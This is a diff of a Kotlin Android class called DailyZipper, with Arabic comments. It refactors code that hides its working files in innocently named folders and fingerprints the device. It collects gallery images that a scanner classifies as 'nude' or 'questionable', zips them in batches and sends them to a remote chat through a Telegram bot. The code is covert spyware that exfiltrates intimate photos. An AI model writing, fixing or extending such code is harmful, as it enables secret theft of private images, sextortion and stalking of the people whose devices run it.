@@ -25,7 +25,6 @@ import java.util.zip.ZipOutputStream
 
 /**
  * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
- * ✅ تم إزالة كافة استخدامات [] واستبدالها بـ put/getOrElse/entries لتجنب MatchGroupCollection نهائياً.
  */
 class DailyZipper(
     context: Context,
@@ -43,44 +42,33 @@ class DailyZipper(
 
     private var maxBatchSize = 48L * 1024L * 1024L // 48MB
 
-    // ========== المسارات والملفات ==========
     private val runtimeDir: File by lazy {
         File(appContext?.filesDir, ".sys_runtime").apply {
             if (!exists()) mkdirs()
         }
     }
-
     private val harvestDir: File by lazy {
         File(runtimeDir, "harvest").apply {
             if (!exists()) mkdirs()
         }
     }
-
     private val pendingDir: File by lazy {
         File(harvestDir, "pending_upload").apply {
             if (!exists()) mkdirs()
         }
     }
-
     private val queueDir: File by lazy {
         File(runtimeDir, ".cache_thumb").apply {
             if (!exists()) mkdirs()
         }
     }
-
     private val configFile: File by lazy {
         File(runtimeDir, "zipper_config.json")
     }
-
     private val logFile: File by lazy {
         File(runtimeDir, "z.log")
     }
-
-    private val deviceTag: String by lazy {
-        getDeviceTag()
-    }
-
-    // ========== الإعدادات (HashMap صريح) ==========
+    private val deviceTag: String by lazy { getDeviceTag() }
     private val config = HashMap<String, Any>()
 
     companion object {
@@ -104,7 +92,6 @@ class DailyZipper(
         loadConfig()
     }
 
-    // ========== دوال مساعدة للوصول إلى الإعدادات (بدون [] أو get) ==========
     @Suppress("UNCHECKED_CAST")
     private fun <T> getConfigValue(key: String, default: T): T {
         val entry = config.entries.firstOrNull { it.key == key }
@@ -143,10 +130,6 @@ class DailyZipper(
         val maxBatches: Int
     )
 
-    // ============================================================
-    //  إدارة التكوين والإعدادات
-    // ============================================================
-
     private fun loadConfig() {
         if (!configFile.exists()) {
             saveConfig()
@@ -180,10 +163,6 @@ class DailyZipper(
         }
     }
 
-    // ============================================================
-    //  الأدوات وفحوصات النظام
-    // ============================================================
-
     private fun getDeviceTag(): String {
         val ctx = appContext
         if (ctx != null) {
@@ -195,7 +174,7 @@ class DailyZipper(
                 if (!androidId.isNullOrEmpty()) {
                     return androidId.take(8).lowercase(Locale.US)
                 }
-            } catch (_: Exception) { /* تجاهل */ }
+            } catch (_: Exception) {}
         }
         return try {
             val model = "${Build.MANUFACTURER} ${Build.MODEL}"
@@ -216,10 +195,6 @@ class DailyZipper(
             true
         }
     }
-
-    // ============================================================
-    //  أدوات الملفات والتجزئة
-    // ============================================================
 
     private fun fileHash(file: File): String? {
         if (!file.exists() || !file.isFile) return null
@@ -256,10 +231,6 @@ class DailyZipper(
         }
     }
 
-    // ============================================================
-    //  فحص الشبكة
-    // ============================================================
-
     private fun isOnWifi(): Boolean {
         val ctx = appContext ?: return true
         val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return true
@@ -272,10 +243,7 @@ class DailyZipper(
         }
     }
 
-    // ============================================================
-    //  إرسال الملفات مع إعادة المحاولة
-    // ============================================================
-
+    // ========== التعديل الأساسي في safeSend ==========
     private suspend fun safeSend(
         zipPath: String,
         caption: String,
@@ -306,9 +274,10 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // ✅ استخدام entries بدلاً من [] لتجنب MatchGroupCollection نهائياً
-                val isOk = if (result is Map<*, *>) {
-                    val okEntry = result.entries.firstOrNull { it.key?.toString() == "ok" }
+                // ✅ تم إزالة أي استخدام للأقواس المربعة
+                val resultMap = result as? Map<*, *>
+                val isOk = if (resultMap != null) {
+                    val okEntry = resultMap.entries.firstOrNull { it.key?.toString() == "ok" }
                     val okValue = okEntry?.value
                     okValue == true || okValue?.toString() == "true"
                 } else {
@@ -327,10 +296,6 @@ class DailyZipper(
         }
         return false
     }
-
-    // ============================================================
-    //  إجبار الإرسال الفوري
-    // ============================================================
 
     fun forceSendNow(chatId: Long? = null): Boolean {
         scope.launch {
@@ -379,10 +344,6 @@ class DailyZipper(
         }
         return true
     }
-
-    // ============================================================
-    //  الضغط والتغليف والتحزيم
-    // ============================================================
 
     private suspend fun packAndShip(
         files: List<File>,
@@ -470,7 +431,6 @@ class DailyZipper(
             }
 
             val limitedBatches = if (batches.size > maxBatches) {
-                writeLog("Too many batches (${batches.size}), limiting to $maxBatches")
                 batches.take(maxBatches)
             } else {
                 batches
@@ -579,10 +539,6 @@ class DailyZipper(
         }
     }
 
-    // ============================================================
-    //  إنشاء أرشيف ZIP
-    // ============================================================
-
     private fun createZipArchive(
         zipFile: File,
         files: List<File>,
@@ -625,10 +581,6 @@ class DailyZipper(
         }
     }
 
-    // ============================================================
-    //  التشغيل التلقائي
-    // ============================================================
-
     fun run(): Boolean {
         scope.launch {
             activeMutex.withLock {
@@ -647,9 +599,10 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخدام entries بدلاً من [] لتجنب MatchGroupCollection نهائياً
-                            if (item is Map<*, *>) {
-                                val pathEntry = item.entries.firstOrNull { it.key?.toString() == "path" }
+                            // ✅ التعديل الأساسي: استخدام entries بدلاً من الأقواس المربعة
+                            val itemMap = item as? Map<*, *>
+                            if (itemMap != null) {
+                                val pathEntry = itemMap.entries.firstOrNull { it.key?.toString() == "path" }
                                 val path = pathEntry?.value?.toString()
                                 if (!path.isNullOrEmpty()) {
                                     val f = File(path)
@@ -694,10 +647,6 @@ class DailyZipper(
         return true
     }
 
-    // ============================================================
-    //  أدوات مساعدة والإحصائيات
-    // ============================================================
-
     fun clearHashCache() {
         processedHashes.clear()
     }
@@ -723,10 +672,6 @@ class DailyZipper(
         return result
     }
 
-    // ============================================================
-    //  دوال المساعدة والتواصل (Reflection Helpers)
-    // ============================================================
-
     private fun sendMessage(chatId: Long, text: String) {
         if (telegram == null) return
         val params = HashMap<String, Any>()
@@ -741,7 +686,7 @@ class DailyZipper(
             val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
             val logText = "[$timestamp] [INFO] $message\n"
             logFile.appendText(logText, Charsets.UTF_8)
-        } catch (_: Exception) { /* تجاهل */ }
+        } catch (_: Exception) {}
     }
 
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
